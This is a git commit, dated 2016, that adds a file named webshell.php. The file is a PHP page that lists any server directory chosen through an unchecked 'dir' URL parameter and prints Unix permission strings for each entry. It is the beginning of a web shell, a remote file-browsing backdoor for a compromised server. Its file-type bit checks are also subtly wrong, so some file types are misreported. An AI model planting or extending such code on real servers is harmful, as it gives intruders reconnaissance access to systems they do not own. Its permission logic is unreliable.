7c458a16e2581fcd7ebf7b9a54f0c145027c1a22
drag0s <drag0s@hotmail.es>
2016-05-26 11:04:09 +0200

    Dirs and permission listing

---
+++ webshell.php
@@ -0,0 +1,50 @@
+<html>
+
+<?php
+
+function printPerms($file) {
+	$mode = fileperms($file);
+	if( $mode & 0x1000 ) { $type='p'; }
+	else if( $mode & 0x2000 ) { $type='c'; }
+	else if( $mode & 0x4000 ) { $type='d'; }
+	else if( $mode & 0x6000 ) { $type='b'; }
+	else if( $mode & 0x8000 ) { $type='-'; }
+	else if( $mode & 0xA000 ) { $type='l'; }
+	else if( $mode & 0xC000 ) { $type='s'; }
+	else $type='u';
+	$owner["read"] = ($mode & 00400) ? 'r' : '-';
+	$owner["write"] = ($mode & 00200) ? 'w' : '-';
+	$owner["execute"] = ($mode & 00100) ? 'x' : '-';
+	$group["read"] = ($mode & 00040) ? 'r' : '-';
+	$group["write"] = ($mode & 00020) ? 'w' : '-';
+	$group["execute"] = ($mode & 00010) ? 'x' : '-';
+	$world["read"] = ($mode & 00004) ? 'r' : '-';
+	$world["write"] = ($mode & 00002) ? 'w' : '-';
+	$world["execute"] = ($mode & 00001) ? 'x' : '-';
+	if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
+	if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
+	if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
+	$s=sprintf("%1s", $type);
+	$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
+	$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
+	$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
+	return $s;
+}
+ 
+
+$dir = "./";
+if (isset($_GET['dir'])) {
+	$dir = $_GET['dir'];
+}
+
+$dirs = scandir($dir);
+
+foreach ($dirs as $key => $value) {
+	echo $value . " " . printPerms($dir.$value) . "<br>";
+	
+}
+
+
+?>
+
+</html>
